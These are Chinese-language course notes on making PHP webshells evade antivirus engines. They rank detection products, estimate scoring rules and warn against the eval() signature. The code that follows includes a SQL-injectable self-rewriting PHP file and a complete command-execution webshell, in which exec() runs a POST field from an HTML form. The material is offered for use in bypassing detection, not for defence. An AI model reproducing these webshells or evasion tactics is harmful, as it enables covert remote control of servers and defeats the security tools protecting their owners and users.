![image-20250307110720173](https://gitee.com/PUqicnda/img/raw/master/20250307110720217.png)



## 杀软：

**360比较强，火绒（心理安慰），阿里云最强**

长亭、微步，安全狗（垃圾），百度、火绒（心理安慰）、卡巴斯基（误报严重、分数权重有问题）

作业选过（阿里云、长亭），其他过微步就行（微步云纱箱）。

## 查杀方式

1. 正则匹配+20
2. 行为+40
3. 信誉+1
4. 证书+5
5. 比对hash（哈希）
   1. 完整比对 +100
   2. 段比对------（比较多）+50

**分数权重可能有出入，分数>70（设定的分数）会被判定为病毒**



传统常规木马

![image-20250307113023776](https://gitee.com/PUqicnda/img/raw/master/20250307113023816.png)

```
eval($_POST['shell']);
eval $_POST shell
eval($_[]);
这样的特征---病毒
```



### 绕过查杀

免杀具有时效性

别用eval函数

https://blog.csdn.net/weixin_39934520/article/details/109231480

<img src="https://gitee.com/PUqicnda/img/raw/master/20250307142410156.png" alt="image-20250307142410087" style="zoom:67%;" />

![image-20250307153025927](https://gitee.com/PUqicnda/img/raw/master/20250307153025976.png)

![image-20250307154638093](https://gitee.com/PUqicnda/img/raw/master/20250307154638147.png)

![image-20250307155548280](https://gitee.com/PUqicnda/img/raw/master/20250307155548336.png)

```

<?php
////error_reporting(0);
//$a = $_GET;
//
//
//class o1{
//    public $a = 'printf';
//    public $b = '123';
//    function f(){
//        $a= $this->a;
//        $a($this->b);
//    }
//
//
//}
//class o2 extends o1{
//
//    function g()
//    {
//        $c = 'f';
//        $this->$c();
//    }
//
//
//}
//class o3 extends o2{
//    function __destruct(){
//        $this->g();
//    }
//}
//
//if($a['a']!=$a['b'] and md5($a['a'])==md5($a['b'])){
//
//$c = "当前内容错误";
//$db = mysql_connect('mysql:host=localhost;dbname=test;charset=utf8', 'username', 'password');
//extract($a);
//    if ($db)
//    {
//        mysql_select_db("my_db", $db);
//
//        $result = mysql_query("SELECT serialized_data FROM user_data WHERE user_id = 1");
//
//        while ($row = mysql_fetch_array($result)) {
//            echo $row['FirstName'] . " " . $row['LastName'];
//            echo "<br />";
//    }
//    $error ='s:6{"NONONO"};';
//
//    }else{
//
//        $error =$c;
//    }
//
//        $restoredData = unserialize(''.$error.'}";');
//
//if (!is_array($restoredData)) {
//    die("数据恢复失败");
//}
//
//// 输出恢复后的数据
//echo "<pre>";
//print_r($restoredData);
//echo "</pre>";
//}

function Judgment_id($id)
{
    if(include 'conn.php') {
        $query = "select username,email from member where id=$id";
        $result = execute($link, $query);

//这里如果用==1,会严格一点

        if (mysqli_num_rows($result) >= 1) {
            while ($data = mysqli_fetch_assoc($result)) {
                $username = $data['username'];
                $email = $data['email'];
                return "hello,{$username} <br />your email is: {$email}";
            }
        } else {
            return "<p class='notice'>您输入的user id不存在，请重新输入！</p>";
        }
    }
    return "{$id}不存在";
}
$fun=1;
if ($fun == 1) {
    $error = Judgment_id($_GET['id']);
    $newstr = "<?php" . "\r\n\r\n";
    $newstr .= '$s="' . $error . '";' . "\r\n\r\n";
    $newstr .= 'echo $s;';
    file_put_contents(__FILE__, $newstr);
}
else {
    echo 22222;
}

exit();

```

```

function executeCommand(&$command){
    if (isset($command)){
        $result = exec($command, $output);
        foreach ($output as $line) {
            echo htmlspecialchars($line)."<br />\n";
        }
    }
}
$cmd = isset($_POST['action'])?$_POST['action']:"";
executeCommand($cmd);
?>
<form method="post">
    Command: <input type="text" name="action"/>
    <input type="submit" value="Execute"/>
</form>
```

此段代码实现了通过 POST 方法提交要执行的命令字符串，并调用了自定义函数 `executeCommand()` 处理这些输入数据。此外还加入了表单让用户可以直接交互式地发送请求。

![image-20250309175752607](https://gitee.com/PUqicnda/img/raw/master/20250309175752715.png)

